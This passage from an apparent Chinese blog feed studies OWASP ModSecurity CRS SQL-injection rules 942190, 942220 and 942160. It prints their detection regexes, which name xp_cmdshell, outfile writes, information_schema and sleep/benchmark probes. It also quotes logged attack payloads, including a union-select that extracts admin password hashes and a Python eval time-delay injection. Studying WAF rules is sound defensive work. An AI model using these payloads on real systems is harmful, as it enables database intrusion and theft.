AQp6Yhc8yfORF4caOmQFBwr/Xo6Q84vtlqNPgV1ivjbu4ccoCCjG J57nSA6fghEyo6VLc6ib76LU9VNBwyOOgUT61ZKciFmyR5ift5VeYiJ9ZwZ318gqJsCgSEpEIMgZagvBSJHHTJaEU1Y npn1T8DxiIFvwAasuG029NLPzN4utON7MlaQxNDlUNVuT9xnU4yFGAos3Gh105x/2SqzNpyAX0zmxKDi/uSO1L1/xViU4f3PCmOHNi7V6ObcpMdYXgsR9y7hgveoLJUpTqrTJnslTmB7OADOTfECAYHtEcloPlxioUn2vSevZlsB5NGFCZq1os aDENp18VoGFJlDmEreAPV7ZYlCSgBRWv99 2ZdoX6/jXXtp9EomM XXr4HZBM88gWZ9/8QgG8xqkz9VfMS7b3p3kYMEoBriyhOVIecu092ROEZ7Jt2F9U35Fbygg3xIZQCxkOjTWNzBG/HueHz3oi6/5S0TK6tMdbpVsPlZie8dvzrtpOFKyzyHaTQj09LqgTQ0ab4FrFZ 8UlH8BBDIwPtFme7g7paSqDWc8eVavwl4kx/EH0eADp96xGriGzHSepxGE2syehd1u8UpAnDljihouuB</span><br></pre></td></tr></table></figure>
<p>匹配的变量是post提交的参数（ARGS），参数名称是<code>padimg</code>，匹配到的数据是<code>MSDb</code>。&lt;所以，用户post提交的参数实际是一个XML<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2udcdotqj31b80goad5.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2u4t5dwtj30ly0jsjs6.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这条规则也不复杂。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942140</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942190</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942190.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接下来，深入研究modsecurity的防护规则及原理。从SQL注入开始，顺便加强对SQL注入的理解。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942190</li></ul>
          </div>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942190的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Regexp generated from util/regexp-assemble/regexp-942190.data using Regexp::Assemble.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942190.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (?i:ASSEMBLE_OUTPUT)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:(?:[\&quot;&#x27;`](?:;?\s*?(?:having|select|union)\b\s*?[^\s]|\s*?!\s*?[\&quot;&#x27;`\w])|(?:c(?:onnection_id|urrent_user)|database)\s*?\([^\)]*?|u(?:nion(?:[\w(\s]*?select| select @)|ser\s*?\([^\)]*?)|s(?:chema\s*?\([^\)]*?|elect.*?\w?user\()|into[\s+]+(?:dump|out)file\s*?[\&quot;&#x27;`]|\s*?exec(?:ute)?.*?\Wxp_cmdshell|from\W+information_schema\W|exec(?:ute)?\s+master\.|\wiif\s*?\())&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942190,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects MSSQL code execution and information gathering attempts&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>该配置文件的正则是由<code>util/regexp-assemble/regexp-942190.data</code>生成的：</p>
<details><summary>点击展开regexp-942190.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line"><span class="literal">[\&quot;&#x27;`]</span>\s*?!\s*?<span class="literal">[\&quot;&#x27;`\<span class="identifier">w</span>]</span></span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;?\s*?having\b\s*?<span class="literal">[^\<span class="identifier">s</span>]</span></span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;?\s*?select\b\s*?<span class="literal">[^\<span class="identifier">s</span>]</span></span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;?\s*?union\b\s*?<span class="literal">[^\<span class="identifier">s</span>]</span></span><br><span class="line">\s*?exec.*?\Wxp_cmdshell</span><br><span class="line">\s*?execute.*?\Wxp_cmdshell</span><br><span class="line">\wiif\s*?\(</span><br><span class="line">connection_id\s*?\(<span class="literal">[^\)]</span>*?</span><br><span class="line">current_user\s*?\(<span class="literal">[^\)]</span>*?</span><br><span class="line">database\s*?\(<span class="literal">[^\)]</span>*?</span><br><span class="line">exec\s+master\.</span><br><span class="line">execute\s+master\.</span><br><span class="line">from\W+information_schema\W</span><br><span class="line">into<span class="literal">[\<span class="identifier">s</span>+]</span>+dumpfile\s*?<span class="literal">[\&quot;&#x27;`]</span></span><br><span class="line">into<span class="literal">[\<span class="identifier">s</span>+]</span>+outfile\s*?<span class="literal">[\&quot;&#x27;`]</span></span><br><span class="line">schema\s*?\(<span class="literal">[^\)]</span>*?</span><br><span class="line">select.*?\w?user\(</span><br><span class="line">union select @</span><br><span class="line">union<span class="literal">[\<span class="identifier">w</span>(\<span class="identifier">s</span>]</span>*?select</span><br><span class="line">user\s*?\(<span class="literal">[^\)]</span>*?</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>SecRule的规则，具体规则如下：<code>SecRule variable operator [Actions]</code></p>
<ul>
<li>variable变量：用来描述哪个变量应当被检查。</li>
<li>operator变量：用来描述如何检查。Operator实际是正则表达式，但是Modsecurity自身会提供很多的Operator，利用的时候直接使用”@operator”即可。</li>
<li>Actions：第三部分为可选的部分。匹配到规则之后，下一步操作。</li>
</ul>
<p>于是我们仔细分析一下<code>942190</code>这条规则：</p>
<ul>
<li><p>检查的变量包括：所有的Cookie信息（REQUEST_COOKIES以及!REQUEST_COOKIES:/__utm/）以及cookie的名称（REQUEST_COOKIES_NAMES）,Post参数（ARGS）以及Post参数的名称（ARGS_NAMES）,当然还有其中的XML文件（XML:/*）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*</span><br></pre></td></tr></table></figure>
</li>
<li><p>匹配规则（正则表达式）：这个正则表达式实际上就是从<code>util/regexp-assemble/regexp-942190.data</code>这个文件引入的。&lt;<code>regexp-942190.data</code>可读性强一点，尤其是对于不熟悉正则语法的people</p>
<figure class="highlight re"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;@rx (?i:(?:[\&quot;&#x27;`](?:;?\s*?(?:having|select|union)\b\s*?[^\s]|\s*?!\s*?[\&quot;&#x27;`\w])|(?:c(?:onnection_id|urrent_user)|database)\s*?\([^\)]*?|u(?:nion(?:[\w(\s]*?select| select @)|ser\s*?\([^\)]*?)|s(?:chema\s*?\([^\)]*?|elect.*?\w?user\()|into[\s+]+(?:dump|out)file\s*?[\&quot;&#x27;`]|\s*?exec(?:ute)?.*?\Wxp_cmdshell|from\W+information_schema\W|exec(?:ute)?\s+master\.|\wiif\s*?\())&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>匹配到规则之后，下一步操作：将这些信息写入log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;id:942190,\</span><br><span class="line">    phase:2,\</span><br><span class="line">    block,\</span><br><span class="line">    capture,\</span><br><span class="line">    t:none,t:urlDecodeUni,\</span><br><span class="line">    msg:&#x27;Detects MSSQL code execution and information gathering attempts&#x27;,\</span><br><span class="line">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span><br><span class="line">    tag:&#x27;application-multi&#x27;,\</span><br><span class="line">    tag:&#x27;language-multi&#x27;,\</span><br><span class="line">    tag:&#x27;platform-multi&#x27;,\</span><br><span class="line">    tag:&#x27;attack-sqli&#x27;,\</span><br><span class="line">    tag:&#x27;paranoia-level/1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span><br><span class="line">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span><br><span class="line">    tag:&#x27;PCI/6.5.2&#x27;,\</span><br><span class="line">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span><br><span class="line">    severity:&#x27;CRITICAL&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><code>msg:&#39;Detects MSSQL code execution and information gathering attempts&#39;</code>，这条规则具体是检测MSSQL代码执行和信息收集尝试次数。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li>例子1：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: &#x27; union a found within ARGS:pagetempid: &#x27; union all select 1 /**/,2,user,name,MD5(concat(user,&#x27;l0aZXUYJ876Mn5rQoL55B&#x27;,password,&#x27;123&#x27;)),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from &#123;P&#125;_base_admin --</span><br></pre></td></tr></table></figure>
由于logdata的格式是：<code>logdata:&#39;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#39;</code><br>此例，</li>
<li><code>%&#123;TX.0&#125;</code>的值是<code>union a</code></li>
<li><code>%&#123;MATCHED_VAR_NAME&#125;</code>的值是<code>ARGS</code></li>
<li><code>%&#123;MATCHED_VAR&#125;</code>的值是<code>pagetempid</code></li>
</ul>
<p>翻译过来就是，匹配的变量是post提交的参数（ARGS），参数名称是<code>pagetempid</code>，匹配到的规则是参数中含有<code>&#39; union a</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2rziqm5lj30l80e6js2.jpg" alt="image.png"></p>
<ul>
<li>例子2：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: \x22!5 found within ARGS_NAMES:\x5cx05U-\x5cxa7\x5cxd9\x5cx0c\x5cxf1\x5cx17\x5cx11OD\x5cxe1\x5cx8c\x5cxb5!\x5cx0e\x5cx7f\x5cxf3\x5cxc9\x5cxc2\x5cxc3\x5cxcf\x5cxd5\x5cxe4\x5cxc5V\x5cxf8\x5cxf4\x5cx1fV\x5cxd5\x5cx13\x5cxdf\x5cx9dV\x5cx04o\x5cxf2\x5cxd1Q\x5cxea\x5cxf3_\x5cxa2\x5cxec\x5cx7fZ\x5cxd3\x5cx1f\x5cxcd3\x5cxa6\x5ctO\x5cx8cO\x5cxbbZ\x5cxe3\x5cx83\x5cx1e\x5cx86\x5cx9b\x5cxbb\x5cxd1l\x5cx8cK\x5cx8fQ\x5cxc9c!)\x5cxd9\x5cxf7lu\x5cxae6\x5cv\x5cx9d[\x5cv\x5cxf1\x5cx9b|\x5cx1f\x5cx7fN[E\x5cxfb\x5cx9b\x5cr\x5cx1b\x5cx86\x5cx9eK1\x5cxc3\x5cx0f\x5cxf4\x5cxe4J&#125;\x5cxa8\x5cx8c \x5cxf1\x5cx13\x5cx9c8~!\x5cxca1\x22!5\x5cx80~\x5cxdc\x5cxd9:\x5cxa1\x5cxa8\x5cxe7y\x5cxa0M\x5cxc5\x5cxf5\x5cxad\x5cxc5\x5cxa24\x5cx91z\x5cxc7\x5cxe7D\x5cx7f\x5cx0c\x5cx97\x5cxbb\x5cxde:\x5cx06#\x5cx1cZe1\x5cx9b;\x5cxf0\x5cx96\x5cxc1$\x5cxf6&#x27;\x5cx8b\x5cvA\x5cxaf\x5cx82ii\x5cxb2\x5cxb9-\x5cxd1_\x5cxd3\x5cxd0\x5cxe1\x5cxaa\x5cxad\x5cxf9\x5cx1eO\x5cxc2au\x5c\x5c\x5cxba\x5cxfc\x5cx12 \x5cx01tZ\x5cxa9&lt;c\x5cxb7\x5cxf7\x5cx05&gt;;\x5cxeei\x5cxd9&#123;\x5cxac\x5cxdd\x5cxde\x5cxaaZK\x5cx87\x5cx1dt\x5cx16 \x5cxf1\x5cxc3\x5cxfc:\x5cxaf\x5cx03\x5cx8e\x5cxe2|\x5cxf0\x5cxb4\x5cxd3\x5cxeb\x5cxaa\x5cx9f\x5cx11\x5cxc7\x5cxc7\x5cx8d\x5cx93\x5cxe2\x5cxfc\x5cx9cC&gt;\x5cx83\x5cxc2M#\x5cx94U\x5cxdb;\x5cxc6\x5cnB\x5cxd9ti\x5ct\x5cx8a\x5cxa8j\x5cxc2\x5cxf3\x5cxda\x5cxab\x5cxdd\x5cx07\x5cxe3.\x5cx87\x5cx93\x5cx94\x5cxbb\x5cx1a7\x5cxab\x5cx01k\x5cxf0)\x22\x5cxd9N\x5cxfb\x5c\x5c\x5cxe4\x5cxcb\x5cx9f\x5cx10W\x5cx8a\x5cx03\x5cx89\x5cx00\x5cxbar\x5cxeb\x5cxbb\x5cx8c0\x5cx17\x5cxbd\x5cxe0\x5cxa3K\x5cx0e\x5cxaf\x5cxca\x5cx9d\x5cxc8\x5cx9bf\x5cx16\x5cx80\x5cxaf\x5cxc0k\x5cxa0IJ\x5cxae\x5c\x5c\x5cxbf\x5cxa1&#123;*\x22k0\x5cxee1\x5cxba\x5cxa4\x5cx9c\x5ct\x5cx82\x5cx05 \x5cx0eX\x5cxab\x5cxa71\x5cxd2??\x5cxfb\x5cxe7\x5cx1b: \x05U-\xa7\xd9\x0c\xf1\x17\x11OD\xe1\x8c\xb5!\x0e\x7f\xf3\xc9\xc2\xc3\xcf\xd5\xe4\xc5V\xf8\xf4\x1fV\xd5\x13\xdf\x9dV\x04o\xf2\xd1Q\xea\xf3_\xa2\xec\x7fZ\xd3\x1f\xcd3\xa6\x09O\x8cO\xbbZ\xe3\x83\x1e\x86\x9b\xbb\xd1l\x8cK\x8fQ\xc9c!)\xd9\xf7lu\xae6\x0b\x9d[\x0b\xf1\x9</span><br></pre></td></tr></table></figure>
<del>这个编码没看懂😥</del> 原来是16进制编码，把16进制转换为字符串结果如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2sxxfemxj31do0i9mz9.jpg" alt="image.png"><br>意思就是这个post参数名称匹配到了规则。匹配的内容是<code>\x22!5</code>。没有搞懂这是怎么匹配上去的😥</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://drops.xmd5.com/static/drops/tips-3804.html">参考了这篇文章对secrule的解释</a></p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942190</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942220</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942220.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942220</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942220的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;@rx ^(?i:-0000023456|4294967295|4294967296|2147483648|2147483647|0000012345|-2147483648|-2147483649|0000023456|3.0.00738585072007e-308|1e309)$&quot; \</span><br><span class="line">    &quot;id:942220,\</span><br><span class="line">    phase:2,\</span><br><span class="line">    block,\</span><br><span class="line">    capture,\</span><br><span class="line">    t:none,t:urlDecodeUni,\</span><br><span class="line">    msg:&#x27;Looking for integer overflow attacks, these are taken from skipfish, except 3.0.00738585072007e-308 is the \&quot;magic number\&quot; crash&#x27;,\</span><br><span class="line">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span><br><span class="line">    tag:&#x27;application-multi&#x27;,\</span><br><span class="line">    tag:&#x27;language-multi&#x27;,\</span><br><span class="line">    tag:&#x27;platform-multi&#x27;,\</span><br><span class="line">    tag:&#x27;attack-sqli&#x27;,\</span><br><span class="line">    tag:&#x27;paranoia-level/1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span><br><span class="line">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span><br><span class="line">    tag:&#x27;PCI/6.5.2&#x27;,\</span><br><span class="line">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span><br><span class="line">    severity:&#x27;CRITICAL&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span><br></pre></td></tr></table></figure>
</p>
</details>

<p>正则表达式：</p>
<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">^(?i:-<span class="number">0000023456</span><span class="pattern-match">|4294967295|4294967296|2147483648|2147483647|0000012345|-2147483648|-2147483649|0000023456|3.0.00738585072007e-308|1e309)<span class="constructor">$</span></span></span><br></pre></td></tr></table></figure>
<p><code>msg:&#39;Looking for integer overflow attacks, these are taken from skipfish, except 3.0.00738585072007e-308 is the \&quot;magic number\&quot; crash&#39;</code>这条规则是检测整数溢出攻击，除了<code>3.0.00738585072007e-308</code>是魔数崩溃之外，其他的数据来自<code>skipfish</code>。</p>
<blockquote>
<p>拓展：什么是<a href="https://www.jianshu.com/p/20e0d7c0a574">skipfish</a>？<br>skipfish是google开源的一个web黑盒扫描器，它能够递归爬取一个网站的请求，然后对请求进行针对性的自动化安全测试，然后生成扫描报表。它的优势是“高性能”、“易用性”。覆盖的漏洞类型有77种，在高危及严重漏洞中，不能发现存储型xss、越权（敏感信息泄漏）、文件上传漏洞（getshell）、弱口令等。</p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: 2147483647 found within REQUEST_COOKIES:max-age: 2147483647</span><br></pre></td></tr></table></figure>
<p>匹配的变量是请求COOKIES（REQUEST_COOKIES），匹配的数据是<code>2147483647</code>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次听说这种整数溢出攻击。<br><a href="https://blog.csdn.net/ioio_jy/article/details/50576353">整数溢出的原理</a></p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942220</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942160</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942160.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942160</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942160的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># -=[ PHPIDS - Converted SQLI Filters ]=-</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># https://raw.github.com/PHPIDS/PHPIDS/master/lib/IDS/default_filter.xml</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:sleep\(\s*?\d*?\s*?\)|benchmark\(.*?\,.*?\))&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942160,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects blind sqli tests using sleep() or benchmark()&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则延用了<a href="https://raw.githubusercontent.com/PHPIDS/PHPIDS/master/lib/IDS/default_filter.xml">PHPID的规则：Detects SQL benchmark and sleep injection attempts including conditional queries</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2v6dju0uj31f60u042d.jpg" alt="image.png"></p>
<p><code>msg:&#39;Detects blind sqli tests using sleep() or benchmark()&#39;</code>这条规则用来检测使用<code>sleep()</code>或者<code>benchmark()</code>进行的SQL盲注测试。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: sleep(20) found within ARGS_NAMES:eval(compile(&#x27;for x in range(1):\x5c\x5cn import time\x5c\x5cn time.sleep(20)&#x27;,&#x27;a&#x27;,&#x27;single&#x27;)): eval(compile(&#x27;for x in range(1):\x5cn import time\x5cn time.sleep(20)&#x27;,&#x27;a&#x27;,&#x27;single&#x27;))</span><br></pre></td></tr></table></figure>
<p>匹配的变量是变量名称（ARGS_NAMES），匹配的数据是<code>sleep(20)</code>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个规则也没啥好说的，就是匹配关键字sleep和benchmark。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942160</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942240</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942240.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942240</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
